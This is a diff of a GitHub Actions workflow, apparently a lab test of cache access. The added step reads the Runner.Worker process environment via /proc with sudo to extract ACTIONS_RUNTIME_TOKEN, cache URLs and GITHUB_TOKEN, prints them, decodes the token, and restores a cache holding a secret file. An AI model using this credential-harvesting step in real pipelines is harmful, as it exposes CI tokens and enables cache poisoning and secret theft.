@@ -6,36 +6,34 @@ jobs:
   inspect-and-read:
     runs-on: ubuntu-latest
     steps:
-      - name: Inspect JWT Token Claims
+      - name: Extract Environment & Inspect Token
         run: |
-          echo "=== DECODING ACTIONS_RUNTIME_TOKEN ==="
-          PAYLOAD=$(echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f2)
-          mod=$(($(echo -n "$PAYLOAD" | wc -c) % 4))
-          if [ $mod -eq 2 ]; then PAYLOAD="${PAYLOAD}=="; fi
-          if [ $mod -eq 3 ]; then PAYLOAD="${PAYLOAD}="; fi
-          echo "$PAYLOAD" | base64 -d | jq .
+          echo "=== SEARCHING RUNNER PROCESS FOR TOKENS ==="
+          # Извлекаем ACTIONS_RUNTIME_TOKEN и URLs из окружения процесса Node/Runner
+          ENV_DUMP=$(sudo strings /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | grep -E 'ACTIONS_CACHE_URL|ACTIONS_RESULTS_URL|ACTIONS_RUNTIME_TOKEN' || true)
+          
+          if [ -z "$ENV_DUMP" ]; then
+            echo "Direct proc dump empty, checking system env..."
+            ENV_DUMP=$(env | grep -E 'ACTIONS|GITHUB_TOKEN')
+          fi
 
-      - name: Attempt Manual Cache Query via Raw API
-        run: |
-          python3 -c "
-          import os, urllib.request, json
+          echo "$ENV_DUMP"
 
-          runtime_url = os.environ.get('ACTIONS_CACHE_URL') or os.environ.get('ACTIONS_RESULTS_URL')
-          token = os.environ.get('ACTIONS_RUNTIME_TOKEN')
+          TOKEN=$(echo "$ENV_DUMP" | grep 'ACTIONS_RUNTIME_TOKEN=' | cut -d'=' -f2-)
+          
+          if [ -n "$TOKEN" ]; then
+            echo "=== DECODING ACTIONS_RUNTIME_TOKEN CLAIMS ==="
+            PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
+            mod=$(($(echo -n "$PAYLOAD" | wc -c) % 4))
+            if [ $mod -eq 2 ]; then PAYLOAD="${PAYLOAD}=="; fi
+            if [ $mod -eq 3 ]; then PAYLOAD="${PAYLOAD}="; fi
+            echo "$PAYLOAD" | base64 -d | jq .
+          else
+            echo "TOKEN NOT FOUND IN RUNNER ENV"
+          fi
 
-          print(f'Target Endpoint: {runtime_url}')
-
-          req_url = f'{runtime_url}_apis/artifactcache/cache?keys=lab-secret-cache-v1'
-          req = urllib.request.Request(req_url, headers={
-              'Authorization': f'Bearer {token}',
-              'Accept': 'application/json;api-version=6.0-preview.1'
-          })
-
-          try:
-              with urllib.request.urlopen(req) as response:
-                  data = json.loads(response.read().decode())
-                  print('RESPONSE SUCCESS:')
-                  print(json.dumps(data, indent=2))
-          except Exception as e:
-              print(f'RESPONSE ERROR: {e}')
-          "
+      - name: Test Cache Read via Official Action Client
+        uses: actions/cache/restore@v4
+        with:
+          path: secret.txt
+          key: lab-secret-cache-v1
